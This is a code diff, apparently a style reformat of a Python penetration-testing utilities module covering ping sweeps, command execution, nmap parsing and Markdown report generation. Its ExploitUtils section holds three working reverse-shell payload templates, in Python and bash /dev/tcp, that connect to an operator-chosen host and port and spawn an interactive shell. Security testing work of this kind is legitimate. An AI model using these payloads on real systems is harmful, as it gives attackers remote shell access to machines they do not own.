@@ -33,7 +33,7 @@ class NetworkUtils:
     def get_network_range():
         """Get network range"""
         ip = NetworkUtils.get_local_ip()
-        parts = ip.split('.')
+        parts = ip.split(".")
         return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
 
     @staticmethod
@@ -47,11 +47,7 @@ class NetworkUtils:
                 cmd = ["ping", "-c", "1", "-t", str(timeout), host]
             else:
                 cmd = ["ping", "-c", "1", "-W", str(timeout), host]
-            result = subprocess.run(
-                cmd,
-                capture_output=True,
-                timeout=timeout + 1
-            )
+            result = subprocess.run(cmd, capture_output=True, timeout=timeout + 1)
             return result.returncode == 0
         except Exception:
             return False
@@ -88,13 +84,8 @@ class SystemUtils:
     def get_tool_version(tool_name):
         """Get tool version"""
         try:
-            result = subprocess.run(
-                [tool_name, "--version"],
-                capture_output=True,
-                text=True,
-                timeout=5
-            )
-            return result.stdout.strip().split('\n')[0]
+            result = subprocess.run([tool_name, "--version"], capture_output=True, text=True, timeout=5)
+            return result.stdout.strip().split("\n")[0]
         except Exception:
             return "Not available"
 
@@ -102,33 +93,17 @@ class SystemUtils:
     def run_command(cmd, timeout=30):
         """Run system command"""
         try:
-            result = subprocess.run(
-                cmd,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=timeout
-            )
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
             return {
                 "success": result.returncode == 0,
                 "stdout": result.stdout,
                 "stderr": result.stderr,
-                "returncode": result.returncode
+                "returncode": result.returncode,
             }
         except subprocess.TimeoutExpired:
-            return {
-                "success": False,
-                "stdout": "",
-                "stderr": "Timeout",
-                "returncode": -1
-            }
+            return {"success": False, "stdout": "", "stderr": "Timeout", "returncode": -1}
         except Exception as e:
-            return {
-                "success": False,
-                "stdout": "",
-                "stderr": str(e),
-                "returncode": -1
-            }
+            return {"success": False, "stdout": "", "stderr": str(e), "returncode": -1}
 
     @staticmethod
     def get_system_info():
@@ -140,7 +115,7 @@ class SystemUtils:
             "version": platform.version(),
             "machine": platform.machine(),
             "processor": platform.processor(),
-            "python": platform.python_version()
+            "python": platform.python_version(),
         }
 
 
@@ -163,6 +138,7 @@ class FileUtils:
         with open(filepath, "w") as f:
             if isinstance(data, dict):
                 import json
+
                 json.dump(data, f, indent=2)
             else:
                 f.write(str(data))
@@ -186,9 +162,9 @@ class ExploitUtils:
     def generate_payload(payload_type, lhost, lport):
         """Generate payload"""
         payloads = {
-            "reverse_tcp": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "reverse_tcp": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
             "reverse_bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-            "reverse_python": f"python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
+            "reverse_python": f'python3 -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'',
         }
         return payloads.get(payload_type, "Payload not found")
 
@@ -216,14 +192,14 @@ class ReportUtils:
         """Generate Markdown report"""
         report = f"""# {title}
 
-**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+**Date:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 **Author:** BlackSentinel Strike
 
 ---
 
 ## Executive Summary
 
-{data.get('summary', 'Pending completion')}
+{data.get("summary", "Pending completion")}
 
 ## Findings
 
@@ -232,28 +208,28 @@ class ReportUtils:
         if "network" in data:
             report += f"""### Network Scan
 
-{data['network']}
+{data["network"]}
 
 """
 
         if "ports" in data:
             report += f"""### Port Scan
 
-{data['ports']}
+{data["ports"]}
 
 """
 
         if "web" in data:
             report += f"""### Web Exploration
 
-{data['web']}
+{data["web"]}
 
 """
 
         if "exploits" in data:
             report += f"""### Exploitation
 
-{data['exploits']}
+{data["exploits"]}
 
 """
 
@@ -290,14 +266,14 @@ class NmapParser:
     def parse_hosts(output):
         """Parse discovered hosts"""
         hosts = []
-        lines = output.split('\n')
+        lines = output.split("\n")
 
         for line in lines:
             if "Nmap scan report for" in line:
                 parts = line.split()
                 if len(parts) >= 5:
                     host = parts[4]
-                    ip = parts[-1].strip('()')
+                    ip = parts[-1].strip("()")
                     hosts.append({"hostname": host, "ip": ip})
 
         return hosts
@@ -306,24 +282,19 @@ class NmapParser:
     def parse_ports(output):
         """Parse open ports"""
         ports = []
-        lines = output.split('\n')
+        lines = output.split("\n")
 
         for line in lines:
             if "/tcp" in line or "/udp" in line:
                 parts = line.split()
                 if len(parts) >= 3:
-                    port_proto = parts[0].split('/')
+                    port_proto = parts[0].split("/")
                     port = port_proto[0]
                     proto = port_proto[1] if len(port_proto) > 1 else "tcp"
                     state = parts[1]
                     service = parts[2] if len(parts) > 2 else "unknown"
 
-                    ports.append({
-                        "port": port,
-                        "protocol": proto,
-                        "state": state,
-                        "service": service
-                    })
+                    ports.append({"port": port, "protocol": proto, "state": state, "service": service})
 
         return ports
 
@@ -331,7 +302,7 @@ class NmapParser:
     def parse_vulnerabilities(output):
         """Parse discovered vulnerabilities"""
         vulns = []
-        lines = output.split('\n')
+        lines = output.split("\n")
 
         for line in lines:
             if "VULNERABLE" in line:
